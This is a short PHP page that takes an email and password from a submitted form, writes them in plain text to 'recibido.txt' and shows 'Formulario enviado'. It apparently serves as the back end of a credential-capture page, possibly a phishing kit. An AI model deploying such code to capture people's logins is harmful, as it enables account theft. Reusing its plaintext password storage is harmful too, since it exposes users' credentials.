<html>
<head>
    <meta charset="UTF-8">

    <?php
      $email = $_POST["email"];
      $password = $_POST["pass"];

      $contenido="
      Email: $email
      Contraseña: $password ";

      $archivo=fopen("recibido.txt","w");
      fwrite($archivo,$contenido);

    ?>
    
    
</head>

<body>
    Formulario enviado
</body>

</html>